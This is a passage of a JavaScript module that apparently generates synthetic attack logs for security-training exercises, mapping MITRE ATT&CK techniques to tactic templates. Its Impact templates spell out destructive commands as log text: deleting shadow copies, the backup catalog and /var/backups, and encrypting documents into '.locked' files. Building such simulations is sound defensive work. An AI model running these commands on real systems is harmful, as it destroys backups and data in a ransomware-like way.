          { weight: 2, level: 'INFO', message: '{{target}} TCP_MISS/200 {{rand:200-900}} GET https://{{sites}}/favicon.ico - DIRECT/{{sites}} image/x-icon' },
        ],
      },
      {
        weight: 2,
        source: { type: 'firewall', name: 'iptables', host: '{{fwpool}}' },
        metadata: {
          event_action: 'connection-allowed',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{source_ip}}',
          protocol: 'tcp',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'ACCEPT IN=eth0 OUT=eth1 SRC={{pivot_ip}} DST={{source_ip}} LEN={{rand:44-400}} TOS=0x00 PREC=0x00 TTL={{rand:52-64}} ID={{rand:1-65535}} DF PROTO=TCP SPT={{port}} DPT=443 WINDOW={{rand:501-65535}} RES=0x00 SYN URGP=0' },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0010: {
    id: 'TA0010',
    name: 'Exfiltration',
    phase: 12,
    defaults: { count: 45, gap: '3m', spread: '120s', level: 'INFO' },
    variants: [
      {
        weight: 3,
        source: { type: 'firewall', name: 'netflow', host: '{{fwpool}}' },
        metadata: {
          event_action: 'flow-record',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{source_ip}}',
          protocol: 'tcp',
        },
        templates: [
          { weight: 4, level: 'INFO', message: 'Flow record: {{target}} -> {{source_ip}}:443 proto=TCP bytes={{rand:4000000-90000000}} packets={{rand:4000-90000}} duration={{rand:60-300}}s flags=.AP.SF' },
          { weight: 1, level: 'WARN', message: 'Flow export buffer full, {{rand:10-400}} records dropped', metadata: { event_action: 'error' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'webserver', name: 'squid-proxy', host: '{{fwpool}}' },
        metadata: {
          event_action: 'http-request',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{source_ip}}',
          status: '200',
          protocol: 'tcp',
        },
        templates: [
          { weight: 3, level: 'INFO', message: '{{target}} TCP_MISS/200 {{rand:900000-9000000}} POST https://{{sites}}/upload - DIRECT/{{sites}} application/octet-stream' },
          { weight: 1, level: 'WARN', message: '{{target}} TCP_DENIED/403 {{rand:200-900}} CONNECT {{sites}}:443 - NONE/- text/html', metadata: { event_action: 'connection-blocked', status: '403' } },
        ],
      },
      {
        weight: 2,
        source: { type: 'firewall', name: 'iptables', host: '{{fwpool}}' },
        metadata: {
          event_action: 'connection-allowed',
          src_ip: '{{pivot_ip}}',
          dst_ip: '{{source_ip}}',
          protocol: 'tcp',
        },
        templates: [
          { weight: 3, level: 'INFO', message: 'ACCEPT IN=eth0 OUT=eth1 SRC={{pivot_ip}} DST={{source_ip}} LEN={{rand:1400-1500}} TOS=0x00 PREC=0x00 TTL={{rand:52-64}} ID={{rand:1-65535}} DF PROTO=TCP SPT={{port}} DPT=443 WINDOW={{rand:501-65535}} RES=0x00 SYN URGP=0' },
        ],
      },
    ],
  },

  // -------------------------------------------------------------------------
  TA0040: {
    id: 'TA0040',
    name: 'Impact',
    phase: 13,
    defaults: { count: 80, gap: '3m', spread: '120s', level: 'WARN' },
    variants: [
      {
        weight: 3,
        source: { type: 'host', name: 'systemd', host: '{{target}}' },
        metadata: { event_action: 'service-stopped', user: '{{actor}}' },
        templates: [
          { weight: 3, level: 'WARN', message: 'Stopping {{svcs}}.service - scheduled maintenance window' },
          { weight: 1, level: 'WARN', message: 'Disabled unit {{svcs}}.service (masked by policy)', metadata: { event_action: 'service-disabled' } },
        ],
      },
      {
        weight: 3,
        source: { type: 'host', name: 'bash', host: '{{target}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'bash' },
        templates: [
          { weight: 3, level: 'WARN', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=openssl enc -aes-256-cbc -in {{docdirs}}/{{docs}} -out {{docdirs}}/{{docs}}.locked' },
          { weight: 2, level: 'WARN', message: 'pid={{pid}} uid={{rand:1000-1010}} user={{actor}} cmd=rm -rf /var/backups' },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'cmd', host: '{{wspool}}' },
        metadata: { event_action: 'process-start', user: '{{actor}}', shell: 'cmd.exe' },
        templates: [
          { weight: 3, level: 'WARN', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c vssadmin delete shadows /all /quiet' },
          { weight: 2, level: 'WARN', message: 'pid={{pid}} user={{actor}} cmd=cmd.exe /c wbadmin delete catalog -quiet' },
        ],
      },
      {
        weight: 2,
        source: { type: 'host', name: 'auditd', host: '{{target}}' },
        metadata: { event_action: 'file-write', user: '{{actor}}', path: '{{docdirs}}/{{docs}}' },
        templates: [
          { weight: 3, level: 'INFO', message: 'type=SYSCALL arch=c000003e syscall=257 success=yes exit={{rand:3-40}} comm="openssl" key="file-write"' },
          { weight: 1, level: 'ERROR', message: 'type=DAEMON_ABORT op=error reason="audit rate limit exceeded" res=failed', metadata: { event_action: 'audit' } },
        ],
      },
      {
        weight: 1,
        source: { type: 'database', name: 'postgres-primary', host: '{{dbpool}}' },
        metadata: { event_action: 'error', service: 'postgresql' },
        templates: [
          { weight: 2, level: 'WARN', message: 'could not receive data from client: Connection reset by peer' },
          { weight: 1, level: 'ERROR', message: 'database system was not properly shut down; automatic recovery in progress' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// TECHNIQUE_TO_TACTIC
//
// A technique can legitimately belong to several tactics -- T1078 Valid Accounts
// is Initial Access, Persistence, Privilege Escalation AND Defense Evasion. This
// map picks ONE: the tactic that best describes what the technique is doing at
// the point a campaign narrative would reach it. That choice is what decides
// which templates the step is built from and where in the timeline it lands, so
// it is a story decision, not a taxonomy decision.
//
// Sub-techniques are listed only where they differ from the parent's answer or
// where a profile is likely to name them directly; anything else falls back to
// its parent (T1566.009 -> T1566) before the kill-chain fallback is reached.
// ---------------------------------------------------------------------------
const TECHNIQUE_TO_TACTIC = {
  // -- Reconnaissance ------------------------------------------------------
  T1595: 'TA0043',
  'T1595.001': 'TA0043',
  'T1595.002': 'TA0043',
  T1592: 'TA0043',
  T1589: 'TA0043',
  T1590: 'TA0043',
  T1591: 'TA0043',
  T1593: 'TA0043',
  T1594: 'TA0043',
  T1596: 'TA0043',
  T1597: 'TA0043',
  T1598: 'TA0043',

  // -- Resource Development ------------------------------------------------
  T1583: 'TA0042',
  T1584: 'TA0042',
  T1585: 'TA0042',
  T1586: 'TA0042',
  T1587: 'TA0042',
  T1588: 'TA0042',
  T1608: 'TA0042',
  T1650: 'TA0042',

  // -- Initial Access ------------------------------------------------------
  T1566: 'TA0001',
  'T1566.001': 'TA0001',
  'T1566.002': 'TA0001',
  'T1566.003': 'TA0001',
  'T1566.004': 'TA0001',
  T1190: 'TA0001',
  T1133: 'TA0001',
  T1189: 'TA0001',
  T1195: 'TA0001',
  'T1195.001': 'TA0001',
  'T1195.002': 'TA0001',
  'T1195.003': 'TA0001',
  T1199: 'TA0001',
  T1200: 'TA0001',
  T1091: 'TA0001',
  // Valid Accounts: four tactics in ATT&CK, but the story beat a profile means
  // by it is almost always "they logged in with credentials they should not have".
  T1078: 'TA0001',
  'T1078.001': 'TA0001',
  'T1078.002': 'TA0001',
  'T1078.003': 'TA0001',
  'T1078.004': 'TA0001',

  // -- Execution -----------------------------------------------------------
  T1059: 'TA0002',
  'T1059.001': 'TA0002',
  'T1059.002': 'TA0002',
  'T1059.003': 'TA0002',
  'T1059.004': 'TA0002',
  'T1059.005': 'TA0002',
  'T1059.006': 'TA0002',
  'T1059.007': 'TA0002',
  'T1059.008': 'TA0002',
  T1203: 'TA0002',
  T1204: 'TA0002',
  'T1204.001': 'TA0002',
  'T1204.002': 'TA0002',
  'T1204.003': 'TA0002',
  T1047: 'TA0002',
  T1106: 'TA0002',
  T1129: 'TA0002',
  T1569: 'TA0002',
  'T1569.002': 'TA0002',
  T1609: 'TA0002',
  T1610: 'TA0002',
  T1648: 'TA0002',
  T1651: 'TA0002',
  // Software Deployment Tools reads as lateral movement in every incident report
  // that has ever mentioned it.
  T1072: 'TA0008',

  // -- Persistence ---------------------------------------------------------
  T1547: 'TA0003',
  'T1547.001': 'TA0003',
  T1543: 'TA0003',
  'T1543.002': 'TA0003',
  'T1543.003': 'TA0003',
  T1136: 'TA0003',
  'T1136.001': 'TA0003',
  'T1136.002': 'TA0003',
  'T1136.003': 'TA0003',
  T1098: 'TA0003',
  'T1098.001': 'TA0003',
  'T1098.002': 'TA0003',
  'T1098.003': 'TA0003',
  'T1098.004': 'TA0003',
  'T1098.005': 'TA0003',
  'T1098.006': 'TA0003',
  'T1098.007': 'TA0003',
  T1505: 'TA0003',
  'T1505.003': 'TA0003',
  T1546: 'TA0003',
  'T1546.003': 'TA0003',
  'T1546.004': 'TA0003',
  T1574: 'TA0003',
  'T1574.001': 'TA0003',
  T1197: 'TA0003',
  T1037: 'TA0003',
  T1176: 'TA0003',
  // Scheduled Task/Job is Execution + Persistence + PrivEsc; the reason it is in
  // a profile at all is that something SURVIVED a reboot.
  T1053: 'TA0003',
  'T1053.002': 'TA0003',
  'T1053.003': 'TA0003',
  'T1053.005': 'TA0003',
  'T1053.006': 'TA0003',
  'T1053.007': 'TA0003',

  // -- Privilege Escalation ------------------------------------------------
  T1548: 'TA0004',
  'T1548.002': 'TA0004',
  'T1548.003': 'TA0004',
  T1068: 'TA0004',
  T1134: 'TA0004',
  'T1134.001': 'TA0004',
  T1484: 'TA0004',
  'T1484.001': 'TA0004',
  T1611: 'TA0004',

  // -- Defense Evasion -----------------------------------------------------
  T1562: 'TA0005',
  'T1562.001': 'TA0005',
  'T1562.002': 'TA0005',
  'T1562.004': 'TA0005',
  'T1562.006': 'TA0005',
  'T1562.008': 'TA0005',
  T1070: 'TA0005',
  'T1070.001': 'TA0005',
  'T1070.002': 'TA0005',
  'T1070.003': 'TA0005',
  'T1070.004': 'TA0005',
  'T1070.006': 'TA0005',
  T1027: 'TA0005',
  'T1027.002': 'TA0005',
  'T1027.010': 'TA0005',
  T1036: 'TA0005',
  'T1036.005': 'TA0005',
  T1112: 'TA0005',
  T1055: 'TA0005',
  'T1055.001': 'TA0005',
  'T1055.012': 'TA0005',
  T1218: 'TA0005',
  'T1218.011': 'TA0005',
  T1140: 'TA0005',
  T1553: 'TA0005',
  T1497: 'TA0005',
  T1620: 'TA0005',
  T1622: 'TA0005',
  T1564: 'TA0005',
  'T1564.001': 'TA0005',
  T1222: 'TA0005',
  T1207: 'TA0005',
  T1211: 'TA0005',
  T1535: 'TA0005',
  T1600: 'TA0005',
  T1601: 'TA0005',

  // -- Credential Access ---------------------------------------------------
  T1003: 'TA0006',
  'T1003.001': 'TA0006',
  'T1003.002': 'TA0006',
  'T1003.003': 'TA0006',
  'T1003.004': 'TA0006',
  'T1003.005': 'TA0006',
  'T1003.006': 'TA0006',
  'T1003.007': 'TA0006',
  'T1003.008': 'TA0006',
  T1110: 'TA0006',
  'T1110.001': 'TA0006',
  'T1110.002': 'TA0006',
  'T1110.003': 'TA0006',
  'T1110.004': 'TA0006',
  T1552: 'TA0006',
  'T1552.001': 'TA0006',
  'T1552.002': 'TA0006',
  'T1552.004': 'TA0006',
  T1555: 'TA0006',
  'T1555.003': 'TA0006',
  T1558: 'TA0006',
  'T1558.003': 'TA0006',
  T1557: 'TA0006',
  'T1557.001': 'TA0006',
  T1040: 'TA0006',
  T1187: 'TA0006',
  T1212: 'TA0006',
  T1539: 'TA0006',
  T1556: 'TA0006',
  'T1556.002': 'TA0006',
  T1606: 'TA0006',
  T1621: 'TA0006',
  T1649: 'TA0006',

  // -- Discovery -----------------------------------------------------------
  T1087: 'TA0007',
  'T1087.001': 'TA0007',
  'T1087.002': 'TA0007',
  'T1087.003': 'TA0007',
  'T1087.004': 'TA0007',
  T1082: 'TA0007',
  T1083: 'TA0007',
  T1018: 'TA0007',
  T1046: 'TA0007',
  T1057: 'TA0007',
  T1016: 'TA0007',
  T1049: 'TA0007',
  T1033: 'TA0007',
  T1007: 'TA0007',
  T1012: 'TA0007',
  T1069: 'TA0007',
  'T1069.001': 'TA0007',
  'T1069.002': 'TA0007',
  T1201: 'TA0007',
  T1518: 'TA0007',
  'T1518.001': 'TA0007',
  T1135: 'TA0007',
  T1010: 'TA0007',
  T1124: 'TA0007',
  T1217: 'TA0007',
  T1482: 'TA0007',
  T1580: 'TA0007',
  T1613: 'TA0007',
  T1614: 'TA0007',

  // -- Lateral Movement ----------------------------------------------------
  T1021: 'TA0008',
  'T1021.001': 'TA0008',
  'T1021.002': 'TA0008',
  'T1021.004': 'TA0008',
  'T1021.005': 'TA0008',
  'T1021.006': 'TA0008',
  T1210: 'TA0008',
  T1570: 'TA0008',
  T1550: 'TA0008',
  'T1550.001': 'TA0008',
  'T1550.002': 'TA0008',
  'T1550.003': 'TA0008',
  'T1550.004': 'TA0008',
  T1563: 'TA0008',
  'T1563.002': 'TA0008',
  T1080: 'TA0008',
  T1534: 'TA0008',

  // -- Collection ----------------------------------------------------------
  T1005: 'TA0009',
  T1039: 'TA0009',
  T1074: 'TA0009',
  'T1074.001': 'TA0009',
  'T1074.002': 'TA0009',
  T1114: 'TA0009',
  'T1114.001': 'TA0009',
  'T1114.002': 'TA0009',
  'T1114.003': 'TA0009',
  T1213: 'TA0009',
  'T1213.002': 'TA0009',
  'T1213.003': 'TA0009',
  T1119: 'TA0009',
  T1560: 'TA0009',
  'T1560.001': 'TA0009',
  T1113: 'TA0009',
  T1056: 'TA0009',
  'T1056.001': 'TA0009',
  T1115: 'TA0009',
  T1123: 'TA0009',
  T1125: 'TA0009',
  T1530: 'TA0009',
  T1602: 'TA0009',

  // -- Command and Control -------------------------------------------------
  T1071: 'TA0011',
  'T1071.001': 'TA0011',
  'T1071.002': 'TA0011',
  'T1071.003': 'TA0011',
  'T1071.004': 'TA0011',
  T1105: 'TA0011',
  T1573: 'TA0011',
  'T1573.001': 'TA0011',
  'T1573.002': 'TA0011',
  T1090: 'TA0011',
  'T1090.001': 'TA0011',
  'T1090.002': 'TA0011',
  'T1090.003': 'TA0011',
  T1219: 'TA0011',
  T1102: 'TA0011',
  T1568: 'TA0011',
  'T1568.002': 'TA0011',
  T1572: 'TA0011',
  T1095: 'TA0011',
  T1571: 'TA0011',
  T1132: 'TA0011',
  T1104: 'TA0011',
  T1008: 'TA0011',
  T1205: 'TA0011',
  T1665: 'TA0011',

  // -- Exfiltration --------------------------------------------------------
  T1041: 'TA0010',
  T1048: 'TA0010',
  'T1048.001': 'TA0010',
  'T1048.002': 'TA0010',
  'T1048.003': 'TA0010',
  T1567: 'TA0010',
  'T1567.002': 'TA0010',
  T1029: 'TA0010',
  T1030: 'TA0010',
  T1020: 'TA0010',
  T1011: 'TA0010',
  T1052: 'TA0010',
  T1537: 'TA0010',

  // -- Impact --------------------------------------------------------------
  T1486: 'TA0040',
  T1490: 'TA0040',
  T1489: 'TA0040',
  T1485: 'TA0040',
  T1491: 'TA0040',
  'T1491.001': 'TA0040',
  'T1491.002': 'TA0040',
  T1496: 'TA0040',
  T1498: 'TA0040',
  'T1498.001': 'TA0040',
  'T1498.002': 'TA0040',
  T1499: 'TA0040',
  'T1499.001': 'TA0040',
  'T1499.002': 'TA0040',
  'T1499.003': 'TA0040',
  'T1499.004': 'TA0040',
  T1531: 'TA0040',
  T1561: 'TA0040',
  'T1561.001': 'TA0040',
  'T1561.002': 'TA0040',
  T1565: 'TA0040',
  'T1565.001': 'TA0040',
  'T1565.002': 'TA0040',
  'T1565.003': 'TA0040',
  T1529: 'TA0040',
  T1495: 'TA0040',
  T1657: 'TA0040',
};

// ---------------------------------------------------------------------------
// Lookup
// ---------------------------------------------------------------------------

const TECHNIQUE_RE = /^T\d{4}(?:\.\d{3})?$/;

/**
 * Canonicalise a technique id, or null if it is not one.
 *
 * Profiles are typed by humans: "t1566.001", " T1486 ", "T1003.001 (LSASS)".
 * Uppercasing and trimming costs nothing and turns three quarters of the
 * would-be fallbacks back into exact hits.
 */
function normalizeTechnique(value) {
  if (value == null) return null;
  const raw = String(value).trim().toUpperCase();
  const m = /^T\d{4}(?:\.\d{3})?/.exec(raw);
  if (!m) return null;
  return TECHNIQUE_RE.test(m[0]) ? m[0] : null;
}

/**
 * Which tactic should a technique's step be built from.
 *
 * Returns { tactic, mapped, reason } rather than a bare string, because the
 * compiler has to WARN on anything it guessed. A scenario silently built out of
 * fallbacks is one an instructor will discover mid-exercise.
 *
 * Resolution order, each deterministic:
 *   1. 'exact'      the id is in the map
 *   2. 'parent'     T1566.009 is unlisted, T1566 is -- inherit it
 *   3. 'position'   unmapped: place it by KILL-CHAIN POSITION. Given
 *                   opts.position (0-based index of this technique in the
 *                   profile's ordered list) and opts.total, spread the list
 *                   evenly across TA0001..TA0040 and take the matching slot.
 *                   An unknown technique that a profile lists FIRST is far more
 *                   likely to be an entry vector than an encryption event, and
 *                   that ordering is the only real signal available.
 *   4. 'default'    no position given: FALLBACK_TACTIC (Execution) -- the one
 *                   tactic that is true of anything that ran at all.
 *
 * Never throws and never returns an unknown tactic: every branch lands on a key
 * of TACTIC_TEMPLATES, because "the profile named something odd" must degrade to
 * a slightly generic exercise, never to a 500.
 */
function tacticFor(technique, opts) {
  const o = opts || {};
  const id = normalizeTechnique(technique);
  if (!id) {
    return { technique: null, tactic: FALLBACK_TACTIC, mapped: false, reason: 'unparseable' };
  }
  if (TECHNIQUE_TO_TACTIC[id]) {
    return { technique: id, tactic: TECHNIQUE_TO_TACTIC[id], mapped: true, reason: 'exact' };
  }
  const parent = id.split('.')[0];
  if (TECHNIQUE_TO_TACTIC[parent]) {
    return { technique: id, tactic: TECHNIQUE_TO_TACTIC[parent], mapped: true, reason: 'parent' };
  }
  const position = Number(o.position);
  const total = Number(o.total);
  if (Number.isFinite(position) && Number.isFinite(total) && total > 1 && position >= 0) {
    const span = FALLBACK_CHAIN.length - 1;
    const clamped = Math.min(position, total - 1);
    const slot = Math.round((clamped / (total - 1)) * span);
    return {
      technique: id,
      tactic: FALLBACK_CHAIN[Math.max(0, Math.min(span, slot))],
      mapped: false,
      reason: 'position',
    };
  }
  return { technique: id, tactic: FALLBACK_TACTIC, mapped: false, reason: 'default' };
}

/** Kill-chain index, or -1. Sort compiled steps by this to narrate in order. */
function tacticIndex(tacticId) {
  return KILL_CHAIN.indexOf(String(tacticId || '').trim().toUpperCase());
}

const TOKEN_RE = /\{\{([a-zA-Z0-9_]+)(?:\.\d+)?(?::\d+-\d+)?\}\}/g;

/**
 * Every {{token}} name a tactic entry references, deduplicated.
 *
 * Derived rather than hand-listed, because a hand-listed one drifts the first
 * time somebody edits a message and the compiler then fails to provide a pool
 * that the template needs -- which surfaces as literal braces in Kibana.
 */
function tokensIn(entry) {
  const out = new Set();
  const scan = (s) => {
    if (typeof s !== 'string') return;
    let m = TOKEN_RE.exec(s);
    while (m) { out.add(m[1]); m = TOKEN_RE.exec(s); }
    TOKEN_RE.lastIndex = 0;
  };
  for (const variant of (entry && entry.variants) || []) {
    for (const v of Object.values(variant.source || {})) scan(v);
    for (const v of Object.values(variant.metadata || {})) scan(v);
    for (const tpl of variant.templates || []) {
      scan(tpl.message);
      for (const v of Object.values(tpl.metadata || {})) scan(v);
    }
  }
  return [...out].sort();
}

module.exports = {
  TACTIC_TEMPLATES,
  TECHNIQUE_TO_TACTIC,
  KILL_CHAIN,
  FALLBACK_CHAIN,
  FALLBACK_TACTIC,
  REQUIRED_ENTITIES,
  BUILTIN_TOKENS,
  normalizeTechnique,
  tacticFor,
  tacticIndex,
  tokensIn,
};
